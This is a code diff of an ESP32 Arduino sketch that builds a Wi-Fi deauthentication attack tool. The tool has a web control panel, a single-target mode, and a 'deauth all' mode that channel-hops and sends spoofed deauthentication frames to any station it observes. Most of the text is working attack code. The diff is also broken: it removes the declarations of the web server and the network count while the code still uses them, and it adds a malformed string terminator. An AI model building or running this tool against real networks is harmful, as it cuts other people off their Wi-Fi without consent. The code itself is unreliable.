@@ -2,12 +2,15 @@
 // This is the combined Arduino sketch (.ino) file from your provided snippets.
 // It implements a Wi-Fi deauthentication tool with a web interface for ESP32.
 //
+// This file now includes code originally in deauth.cpp and parts of web_interface.h.
+//
 // IMPORTANT: This code relies heavily on the header files provided below:
 // - "type.h"
-// - "deauth.h"
 // - "definitions.h"
-// - "web_interface.h"
+// - "web_interface.h" // Still needed for declarations not moved here, or if it has other content
 // Ensure these files are in the SAME folder as this .ino file.
+// deauth.h is no longer strictly necessary if all its functions are defined here,
+// but including it won't hurt if it only contains declarations.
 
 #include <Arduino.h> // Standard Arduino header
 #include <WiFi.h>      // For Wi-Fi functions (scan, mode, etc.)
@@ -16,39 +19,30 @@
 
 // Include your custom header files - these MUST be in the same folder
 #include "type.h" // Using type.h as requested
-#include "deauth.h"      // Provides declarations for start_deauth, stop_deauth
 #include "definitions.h" // Provides definitions for macros and constants
-#include "web_interface.h" // Provides declarations for web interface functions
+#include "web_interface.h" // Provides declarations for web interface functions (Keep this if it has other content or declarations needed)
+// #include "deauth.h" // This header is likely redundant now as start_deauth/stop_deauth are defined here
 
 
 // --- Global Variables ---
 // These are used across different parts of the code
 deauth_frame_t deauth_frame; // Used for building deauthentication frames (defined in type.h)
-int deauth_type = DEAUTH_TYPE_SINGLE; // Tracks the current type of deauth attack (DEAUTH_TYPE_SINGLE/ALL defined in definitions.h)
+int deauth_type = DEAUTH_TYPE_NONE; // Initialize to NONE (0) when starting up
 int eliminated_stations; // Counter for stations deauthenticated in single mode
 int curr_channel = 1; // Used for channel hopping in "deauth all" mode
 
+// --- External Variable (defined in type.h, used here) ---
+extern const wifi_promiscuous_filter_t filt; // The promiscuous filter
+
 
 // --- External Function Declarations (from ESP-IDF or other sources) ---
-
-// External declaration for a required ESP-IDF function to transmit raw frames.
-// Note: Direct use of esp_wifi_80211_tx might require specific ESP-IDF configurations or specific ESP-IDF build.
+// These remain external as they are part of the ESP-IDF/system libraries.
 extern esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
 
 // Required external function likely for ESP-IDF API compatibility with promiscuous mode.
-// Note: Its implementation below is trivial (returns 0) and performs no actual check.
-// Its presence might be required by the ESP-IDF API signature it's intended to hook into.
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
   return 0; // Functionally useless body, but declaration might be needed.
 }
-
-
-// --- Web Server Globals (Defined here as used locally) ---
-WebServer server(80); // Web server instance on port 80
-int num_networks; // Stores the number of scanned networks
-
-// Forward declaration for a function defined later in this file (optional in .ino, but good practice)
-String getEncryptionType(wifi_auth_mode_t encryptionType);
 
 
 // --- Deauth Promiscuous Mode Sniffer Function ---
@@ -88,12 +82,13 @@ IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
         // Send deauth frames using the raw transmit function
         // Transmit from the AP interface if acting as an AP for single target
         // Note: This might need refinement. Usually you send deauth frames from the STA interface,
-        // Spoofing the AP's MAC address.
+        // Spoofing the AP's MAC address. The interface choice here (WIFI_IF_AP vs WIFI_IF_STA)
+        // might depend on the ESP-IDF version or specific configuration.
         esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
       }
       eliminated_stations++; // Increment counter for eliminated stations
     }
-  } else { // Assuming the other type is targeting all stations (DEAUTH_TYPE_ALL or similar)
+  } else if (deauth_type == DEAUTH_TYPE_ALL) { // Added check for DEAUTH_TYPE_ALL
     // In this mode, we are looking for frames *from* stations (`addr2`) directed *to* an AP (`addr1` == `bssid`).
     // We ignore broadcast/multicast destinations (`FF:FF:FF:FF:FF:FF`).
     if ((memcmp(mac_header->addr1, mac_header->bssid, 6) == 0) && (memcmp(mac_header->addr1, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0)) {
@@ -117,18 +112,20 @@ IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
   // Note: Printing/delaying inside an IRAM_ATTR function should be minimized or avoided if possible
   // as it can cause timing issues or crashes. Consider setting a flag and handling debug/LED outside sniffer.
 #ifdef SERIAL_DEBUG
+  // Avoid heavy printing inside IRAM_ATTR if possible. Maybe set a flag.
+  // For simplicity, keeping it as is based on original, but be aware.
   DEBUG_PRINTF("Send %d Deauth-Frames from %02X:%02X:%02X:%02X:%02X:%02X to: %02X:%02X:%02X:%02X:%02X:%02X\n",
                NUM_FRAMES_PER_DEAUTH,
                deauth_frame.sender[0], deauth_frame.sender[1], deauth_frame.sender[2], deauth_frame.sender[3], deauth_frame.sender[4], deauth_frame.sender[5],
                deauth_frame.station[0], deauth_frame.station[1], deauth_frame.station[2], deauth_frame.station[3], deauth_frame.station[4], deauth_frame.station[5]);
 #endif
 #ifdef LED
-  BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION);
+  // BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION); // Avoid delay in IRAM_ATTR if possible
 #endif
 }
 
 
-// --- Utility Functions ---
+// --- Utility Functions (Defined here as used locally) ---
 
 // Conditional compilation for LED blinking function (requires LED define from definitions.h)
 #ifdef LED
@@ -158,7 +155,7 @@ String getEncryptionType(wifi_auth_mode_t encryptionType) {
     case WIFI_AUTH_WPA_WPA2_PSK: return "WPA_WPA2_PSK";
     case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2_ENTERPRISE";
     // Commenting out WPA3 modes as they might not be defined in all ESP-IDF versions/configs
-    // case WIFI_AUTH_WPA3_PSK: return "WPA3_PSK"; // <-- Error was here
+    // case WIFI_AUTH_WPA3_PSK: return "WPA3_PSK";
     // case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2_WPA3_PSK";
     case WIFI_AUTH_MAX: // This is usually the last enum value, representing the count
     default: return "UNKNOWN"; // Handle any other cases
@@ -166,7 +163,181 @@ String getEncryptionType(wifi_auth_mode_t encryptionType) {
 }
 
 
-// --- Web Server Request Handlers ---
+// --- Deauth Attack Functions (Definitions moved from deauth.cpp) ---
+
+void start_deauth(int network_num, int type, uint16_t reason_code) {
+    DEBUG_PRINTF("Starting deauth attack type: %d, reason: %d\n", type, reason_code);
+
+    // Stop any existing Wi-Fi operations (STA or AP) to ensure promiscuous mode works correctly
+    // Note: This will stop the SoftAP needed for the web server.
+    WiFi.disconnect(true); // Disconnect from any connected network
+    WiFi.mode(WIFI_MODE_NULL); // Set mode to null before changing
+    delay(100); // Give Wi-Fi a moment to settle
+
+    deauth_type = type; // Set the global deauth type
+    eliminated_stations = 0; // Reset station counter
+
+    // Configure the deauth frame fields that are common to both attack types
+    // Frame control (0xC000 for deauthentication) is initialized in the global deauth_frame in .ino
+    deauth_frame.reason = reason_code;
+    // Set a reasonable duration (e.g., 312 microseconds, represented as 0x0138)
+    // This value can vary, 0x0138 is common.
+    deauth_frame.duration[0] = 0x38;
+    deauth_frame.duration[1] = 0x01;
+    // fragment_sequence is initialized in the global deauth_frame in .ino
+
+    if (deauth_type == DEAUTH_TYPE_SINGLE) {
+        // For single mode, we need the target AP's BSSID and channel
+        // Assumes WiFi.scanNetworks() has been run and network_num is valid
+        if (network_num >= 0 && network_num < WiFi.scanComplete()) {
+            uint8_t *bssid = WiFi.BSSID(network_num);
+            int channel = WiFi.channel(network_num);
+
+            // Copy the target AP's BSSID into the deauth frame's sender and access_point fields
+            // These fields represent the Source Address (Addr2) and BSSID (Addr3) of the deauth frame being sent
+            memcpy(deauth_frame.sender, bssid, 6);
+            memcpy(deauth_frame.access_point, bssid, 6);
+
+            // Set the Wi-Fi channel to the target network's channel
+            esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+            DEBUG_PRINTF("Targeting AP: %s on Channel: %d\n", WiFi.BSSIDstr(network_num).c_str(), channel);
+
+            // Set mode to STA for sniffing/TX. Note the conflict with the web server AP.
+            WiFi.mode(WIFI_MODE_STA);
+            delay(100);
+
+            // Enable promiscuous mode to capture frames (primarily from the target AP)
+            esp_wifi_set_promiscuous(true);
+            esp_wifi_set_promiscuous_filter(&filt); // Apply the filter for Management and Data frames
+            esp_wifi_set_promiscuous_rx_cb(&sniffer); // Register the sniffer callback
+
+             DEBUG_PRINTF("Promiscuous mode started for single deauth.\n");
+
+        } else {
+            DEBUG_PRINTF("Error: Invalid network number %d for single deauth.\n", network_num);
+            // If invalid network, revert state or indicate error
+            deauth_type = DEAUTH_TYPE_NONE; // Revert type
+            // Need to restart web server AP here if mode was changed and scan failed
+             WiFi.mode(WIFI_MODE_AP);
+             WiFi.softAP(AP_SSID, AP_PASS);
+             DEBUG_PRINTF("Reverted to AP mode due to invalid network selection.\n");
+        }
+
+    } else if (deauth_type == DEAUTH_TYPE_ALL) {
+        // For "deauth all" mode, we hop channels and listen for any station traffic
+        // The sniffer will identify stations and their APs on the current channel.
+
+        // Set mode to STA for sniffing/TX and channel hopping. Note the conflict with the web server AP.
+        WiFi.mode(WIFI_MODE_STA);
+         delay(100);
+
+
+        // Enable promiscuous mode to capture frames
+        esp_wifi_set_promiscuous(true);
+        esp_wifi_set_promiscuous_filter(&filt); // Apply the filter for Management and Data frames
+        esp_wifi_set_promiscuous_rx_cb(&sniffer); // Register the sniffer callback
+
+        curr_channel = 1; // Start channel hopping from channel 1
+        DEBUG_PRINTF("Promiscuous mode started for deauth all. Starting channel hopping.\n");
+
+        // Note: The web server is stopped in handle_deauth_all before calling start_deauth(ALL).
+        // The loop() in deauth.ino will now handle channel hopping.
+    } else {
+         DEBUG_PRINTF("Warning: start_deauth called with unknown type %d.\n", type);
+         deauth_type = DEAUTH_TYPE_NONE; // Ensure type is none
+         // Need to restart web server AP here if mode was changed
+          WiFi.mode(WIFI_MODE_AP);
+          WiFi.softAP(AP_SSID, AP_PASS);
+          DEBUG_PRINTF("Reverted to AP mode due to unknown deauth type.\n");
+    }
+
+    // Note on Wi-Fi Mode Conflict:
+    // The web server runs on a SoftAP started in setup().
+    // start_web_interface (called from setup) also sets mode to STA and disconnects,
+    // potentially breaking the initial AP.
+    // start_deauth (called from web handlers) also sets mode to STA.
+    // stop_deauth needs to restore the AP.
+    // This sequence of mode changes is complex and prone to issues.
+    // If the web server is intended to run on the SoftAP created in setup(),
+    // start_web_interface should probably NOT change the WiFi mode.
+    // Similarly, start_deauth changing the mode will stop the web server AP.
+    // The current implementation expects stop_deauth to restart the AP.
+}
+
+void stop_deauth() {
+    if (deauth_type != DEAUTH_TYPE_NONE) {
+        DEBUG_PRINTF("Stopping deauth attack.\n");
+
+        // Disable promiscuous mode and unregister the sniffer callback
+        esp_wifi_set_promiscuous(false);
+        esp_wifi_set_promiscuous_rx_cb(NULL);
+
+        // Reset the deauth type to indicate no attack is active
+        deauth_type = DEAUTH_TYPE_NONE;
+        eliminated_stations = 0; // Reset counter on stop
+
+        // --- Restore Wi-Fi mode for the Web Server ---
+        // This assumes the web server runs on the SoftAP and that start_deauth
+        // changed the mode away from SoftAP.
+        WiFi.mode(WIFI_MODE_AP);
+        // Restart the SoftAP with the defined credentials
+        WiFi.softAP(AP_SSID, AP_PASS);
+
+        DEBUG_PRINTF("Deauth stopped. Restored AP mode for web server. IP: ");
+        DEBUG_PRINTF("%s\n", WiFi.softAPIP().toString().c_str()); // Print IP as String
+
+        // Note: The handle_stop function in deauth.ino calls server.begin() AFTER stop_deauth().
+        // This sequence should allow the web server to resume on the re-established AP.
+
+    } else {
+        DEBUG_PRINTF("No deauth attack currently active to stop.\n");
+    }
+}
+
+// --- Web Interface Initialization and Handling (Definitions moved from web_interface.h) ---
+// NOTE: These functions were previously declared in web_interface.h.
+// If you remove web_interface.h, you'll need to ensure any includes it had are present here.
+
+void start_web_interface() {
+  // --- POTENTIAL WI-FI MODE CONFLICT NOTED HERE ---
+  // The setup() function below sets WiFi.mode(WIFI_MODE_AP) and starts a softAP.
+  // This function (start_web_interface), which is called from setup(),
+  // then immediately changes the mode to WIFI_STA and disconnects.
+  // This sequence is likely incorrect if the web server is intended to run
+  // on the softAP you just created. For the web server to be accessible,
+  // the ESP32 needs an active interface (like the AP or a connected STA).
+  // If you want the web server on the SoftAP, REMOVE the two lines below.
+  // If you intend to connect to an existing network as STA for the web UI,
+  // you need additional logic here to connect.
+  // WiFi.mode(WIFI_MODE_STA); // Sets STA mode (potentially overriding AP from setup) - Removed based on conflict note
+  // WiFi.disconnect();   // Disconnects from any network (breaks SoftAP if it was active) - Removed based on conflict note
+  delay(100); // Give it a moment (still might be needed for stability)
+
+  // Perform an initial scan when starting the web interface
+  // This might take time and block the UI during startup.
+  num_networks = WiFi.scanNetworks();
+
+  // Define the request handlers for the web server URLs and HTTP methods
+  server.on("/", handle_root);
+  server.on("/deauth", HTTP_POST, handle_deauth);
+  server.on("/deauth_all", HTTP_POST, handle_deauth_all);
+  server.on("/rescan", HTTP_POST, handle_rescan);
+  server.on("/stop", HTTP_POST, handle_stop);
+
+  server.begin(); // Start the HTTP server
+
+#ifdef SERIAL_DEBUG
+  Serial.println("HTTP server started");
+#endif
+}
+
+void web_interface_handle_client() {
+  server.handleClient(); // Process incoming web client requests
+}
+
+
+// --- Web Server Request Handlers (Defined here as used locally in .ino) ---
+// These were already defined in the original deauth.ino
 
 // Handler for the root URL ("/") - serves the main HTML page
 void handle_root() {
@@ -555,14 +726,14 @@ void handle_deauth() {
         <p>Reason code: )" + String(reason) + R"(</p>
         <a href="/" class="button">Back to Home</a>
     </div>)=====";
-    // Call the start_deauth function (declared in deauth.h, defined elsewhere/merged)
+    // Call the start_deauth function (declared/defined in this file)
     start_deauth(wifi_number, DEAUTH_TYPE_SINGLE, reason);
   } else {
     html += R"=====( error">
         <h2>Error: Invalid Network Number</h2>
         <p>Please select a valid network number from the list.</p>
         <a href="/" class="button">Back to Home</a>
-    </div>)=====";
+    </div>)=====(;
   }
 
   html += R"=====(
@@ -634,7 +805,7 @@ void handle_deauth_all() {
   delay(100); // Small delay to ensure response is sent before stopping server
 
   server.stop(); // Stop the web server before starting the "all" attack
-  // Call the start_deauth function (declared in deauth.h, defined elsewhere/merged)
+  // Call the start_deauth function (declared/defined in this file)
   start_deauth(0, DEAUTH_TYPE_ALL, reason); // wifi_number 0 is ignored in DEAUTH_TYPE_ALL
 }
 
@@ -646,52 +817,12 @@ void handle_rescan() {
 
 // Handler for stopping the deauth attack
 void handle_stop() {
-  stop_deauth(); // Call the stop_deauth function (declared in deauth.h, defined elsewhere/merged)
+  stop_deauth(); // Call the stop_deauth function (declared/defined in this file)
   // IMPORTANT: If server.stop() was called in handle_deauth_all, you might need
   // to restart the web server here to access the UI again. Add server.begin();
   // if needed, but consider the Wi-Fi mode implications.
   server.begin(); // Attempt to restart the web server
   redirect_root(); // Redirect back to the main page
-}
-
-
-// --- Web Interface Initialization and Handling ---
-// These functions are declared in web_interface.h
-
-void start_web_interface() {
-  // --- POTENTIAL WI-FI MODE CONFLICT NOTED HERE ---
-  // The setup() function below sets WiFi.mode(WIFI_MODE_AP) and starts a softAP.
-  // This function (start_web_interface), which is called from setup(),
-  // then immediately changes the mode to WIFI_STA and disconnects.
-  // This sequence is likely incorrect if the web server is intended to run
-  // on the softAP you just created. For the web server to be accessible,
-  // the ESP32 needs an active interface (like the AP or a connected STA).
-  // If you want the web server on the SoftAP, REMOVE the two lines below.
-  // If you intend to connect to an existing network as STA for the web UI,
-  // you need additional logic here to connect.
-  WiFi.mode(WIFI_MODE_STA); // Sets STA mode (potentially overriding AP from setup)
-  WiFi.disconnect();   // Disconnects from any network (breaks SoftAP if it was active)
-  delay(100); // Give it a moment
-
-  // Perform an initial scan when starting the web interface
-  num_networks = WiFi.scanNetworks();
-
-  // Define the request handlers for the web server URLs and HTTP methods
-  server.on("/", handle_root);
-  server.on("/deauth", HTTP_POST, handle_deauth);
-  server.on("/deauth_all", HTTP_POST, handle_deauth_all);
-  server.on("/rescan", HTTP_POST, handle_rescan);
-  server.on("/stop", HTTP_POST, handle_stop);
-
-  server.begin(); // Start the HTTP server
-
-#ifdef SERIAL_DEBUG
-  Serial.println("HTTP server started");
-#endif
-}
-
-void web_interface_handle_client() {
-  server.handleClient(); // Process incoming web client requests
 }
 
 
